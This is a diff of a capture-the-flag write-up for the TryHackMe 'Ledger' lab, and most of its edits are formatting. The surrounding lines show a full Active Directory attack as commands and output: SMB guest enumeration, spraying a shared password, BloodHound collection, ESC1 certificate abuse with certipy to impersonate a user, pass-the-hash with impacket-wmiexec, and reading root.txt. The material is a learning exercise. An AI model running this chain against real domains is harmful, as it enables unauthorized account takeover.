@@ -182,11 +182,13 @@ PORT      STATE  SERVICE    VERSION
 
 <br>
 
-<h3><code>/etc/hosts</code></h3>
+<h3>/etc/hosts</h3>
 
 ```bash
 TargetIP    labyrinth.thm.local thm.local LABYTINTH  
 ```
+
+<br>
 
 <h3>ping</h3>
 
@@ -196,6 +198,8 @@ PING labyrinth.thm.local (TargetIP) 56(84) bytes of data.
 64 bytes from labyrinth.thm.local (TargetIP): icmp_seq=1 ttl=128 time=0.296 ms
 ...
 ```
+
+<br>
 
 <h3>labyrinth.thm.local</h3>
 
@@ -311,7 +315,7 @@ smb: \> exit
 
 <br>
 
-<h3>crackmapexec</h3>
+<h3>crackmapexec smb</h3>
 
 ```bash
 :~/Ledger# crackmapexec smb TargetIP -u 'guest' -p ''
@@ -319,7 +323,9 @@ SMB         TargetIP    445    LABYRINTH        [*] Windows 10.0 Build 17763 x64
 SMB         TargetIP    445    LABYRINTH        [+] thm.local\guest: 
 ```
 
-<p>or</p>
+<br>
+
+<h3>nxc smb</h3>
 
 ```bash
 :~/Ledger# nxc smb ledger.thm -u guest -p ''
@@ -366,6 +372,7 @@ SMB         TargetIP    445    LABYRINTH        1160: THM\AMOS_MCPHERSON (SidTyp
 ...
 ```
 
+<h4>Users with 'Cxxxxxxxxx23!' password</h4>
 
 ```bash
 :~/Ledger# nxc smb ledger.thm -u usernames.txt -p 'Cxxxxxxxxx23!' --continue-on-success
@@ -374,6 +381,9 @@ SMB         TargetIP    445    LABYRINTH        [+] thm.local\IVY_WILLIS:Cxxxxxx
 SMB         TargetIP    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:Cxxxxxxxxx23!
 ```
 
+<br>
+
+<h3>BloodHound</h3>
 
 ```bash
 :~/Ledger# bloodhound-python -d thm.local -c All -u 'IVY_WILLIS' -p 'Cxxxxxxxxx23!' -ns TargetIP --dns-tcp
@@ -395,6 +405,8 @@ INFO: Querying computer: labyrinth.thm.local
 INFO: Done in 00M 05S
 ```
 
+<br>
+
 <h3>Remmina</h3>
 
 <p>
@@ -408,9 +420,16 @@ INFO: Done in 00M 05S
 <img width="1069" height="634" alt="image" src="https://github.com/user-attachments/assets/8353e201-9e54-459e-853b-7536a4fe3e5b" />
 
 <br>
+
+<h3>/etc/hosts</h3>
+
+```bash
+TargetIP    ledger.thm labyrinth.thm.local thm.local LABYRINTH thm-LABYRINTH-CA
+```
+
 <br>
 
-<h3>certipy-ad</h3>
+<h3>certipy</h3>
 
 ```bash
 :~/Ledger# python3 -m venv venv
@@ -419,13 +438,6 @@ INFO: Done in 00M 05S
 ...
 ```
 
-<br>
-
-<h3>/etc/hosts</h3>
-
-```bash
-TargetIP    ledger.thm labyrinth.thm.local thm.local LABYRINTH thm-LABYRINTH-CA
-```
 
 <br>
 
@@ -549,6 +561,8 @@ Certificate Templates
       ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
+<br>
+
 
 ```bash
 (venv) :~/Ledger#  certipy req -u 'Susanna_McKnight@thm.local' -p 'Cxxxxxxxxx23!' -dc-ip 'TargetIP' -target 'labyrinth.thm.local' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'Bradley_Ortiz@thm.local'
@@ -562,6 +576,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'bradley_ortiz.pfx'
 ```
 
+<br>
+
 ```bash
 (venv) :~/Ledger#  certipy auth -pfx bradley_ortiz.pfx -dc-ip TargetIP
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -574,9 +590,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'bradley_ortiz@thm.local': ........1404ee:16ec31963c93240962b7e60fd97b495d
 ```
 
+<br>
+
 ```bash
 (venv) :~/Ledger#  apt install python3-impacket
 ```
+
+<br>
 
 ```bash
 (venv) :~/Ledger#  impacket-wmiexec -hashes ........1404ee:16ec31963c93240962b7e60fd97b495d THM.LOCAL/bradley_ortiz@labyrinth.thm.local
@@ -588,10 +608,14 @@ Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 C:\>
 ```
 
+<br>
+
 ```bash
 C:\>whoami
 thm\bradley_ortiz
 ```
+
+<br>
 
 ```bash
 C:\>whoami /priv
@@ -629,6 +653,7 @@ SeCreateSymbolicLinkPrivilege             Create symbolic links                 
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 ```
 
+<br>
 
 ```bash
 C:\>cd C:Users\Administrator\Desktop
@@ -647,6 +672,7 @@ C:\Users\Administrator\Desktop>dir
                2 Dir(s)  12,527,595,520 bytes free
 ```
 
+<br>
 
 ```bash
 C:\Users\Administrator\Desktop>type root.txt
